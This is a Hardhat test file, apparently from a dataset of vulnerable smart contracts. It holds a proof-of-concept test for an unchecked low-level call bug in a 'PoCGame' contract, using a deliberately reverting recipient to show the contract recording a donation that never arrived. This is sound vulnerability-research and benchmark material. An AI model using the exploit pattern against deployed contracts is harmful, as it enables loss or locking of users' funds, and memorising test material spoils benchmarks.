const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const path = require("path");
const fs = require("fs");

describe("attack unchecked_low_level_calls/0x7d09edb07d23acb532a82be3da5c17d9d85806b4.sol", function () {
  let owner, amount;

  async function deployContracts() {
    amount = ethers.parseEther("0.01");
    [owner] = await ethers.getSigners();
    const RevertContract = await ethers.getContractFactory(
      "contracts/unchecked_low_level_calls/revert_contract.sol:RevertContract",
    );
    const revertContract = await RevertContract.deploy();

    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/unchecked_low_level_calls/0x7d09edb07d23acb532a82be3da5c17d9d85806b4.sol/PoCGame.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    const PoCGame = await ethers.getContractFactory(json.abi, json.bytecode);
    const contract = await PoCGame.connect(owner).deploy(
      revertContract.target,
      amount,
    );

    const SuccessContract = await ethers.getContractFactory(
      "contracts/unchecked_low_level_calls/success_contract.sol:SuccessContract",
    );
    const successContract = await SuccessContract.deploy();

    const successPoC = await PoCGame.connect(owner).deploy(
      successContract.target,
      amount,
    );

    return { contract, revertContract, successPoC, successContract };
  }

  it("functional check: unchecked_low_level_calls/0x7d09edb07d23acb532a82be3da5c17d9d85806b4.sol", async function () {
    const { successPoC, successContract } = await loadFixture(deployContracts);
    const [v, a] = await ethers.getSigners();
    const donatedValue = await ethers.provider.getStorage(successPoC.target, 8);
    expect(Number(donatedValue)).to.be.equal(0);
    await expect(successPoC.connect(owner).AdjustDifficulty(amount))
      .to.emit(successPoC, "DifficultyChanged")
      .withArgs(amount);
    await successPoC.connect(owner).OpenToThePublic();

    await expect(successPoC.connect(a).wager({ value: amount }))
      .to.emit(successPoC, "Wager")
      .withArgs(amount, a.address);

    expect(await ethers.provider.getBalance(successPoC.target)).to.be.equal(
      amount,
    );
    await expect(successPoC.connect(a).play())
      .to.emit(successPoC, "Lose")
      .withArgs(amount / BigInt(2), a.address);

    expect(await ethers.provider.getBalance(successPoC.target)).to.be.equal(
      amount / BigInt(2),
    );
    expect(
      await ethers.provider.getBalance(successContract.target),
    ).to.be.equal(amount / BigInt(2));
    const donatedValueAfter = await ethers.provider.getStorage(
      successPoC.target,
      8,
    );
    expect(Number(donatedValueAfter)).to.be.equal(amount / BigInt(2));
  });

  it("exploit unchecked low level call vulnerability", async function () {
    const { contract, revertContract } = await loadFixture(deployContracts);
    await expect(
      owner.sendTransaction({
        to: revertContract.target,
        value: amount,
      }),
    ).to.be.revertedWith("I always revert!");

    const donatedValue = await ethers.provider.getStorage(contract.target, 8);
    expect(Number(donatedValue)).to.be.equal(0);
    await expect(contract.connect(owner).AdjustDifficulty(amount))
      .to.emit(contract, "DifficultyChanged")
      .withArgs(amount);
    await contract.connect(owner).OpenToThePublic();

    await expect(contract.connect(owner).wager({ value: amount }))
      .to.emit(contract, "Wager")
      .withArgs(amount, owner.address);

    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(
      amount,
    );
    await expect(contract.connect(owner).play())
      .to.emit(contract, "Lose")
      .withArgs(amount / BigInt(2), owner.address);

    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(
      amount,
    );
    expect(await ethers.provider.getBalance(revertContract.target)).to.be.equal(
      0,
    );
    const donatedValueAfter = await ethers.provider.getStorage(
      contract.target,
      8,
    );
    expect(Number(donatedValueAfter)).to.be.equal(amount / BigInt(2));
  });
});
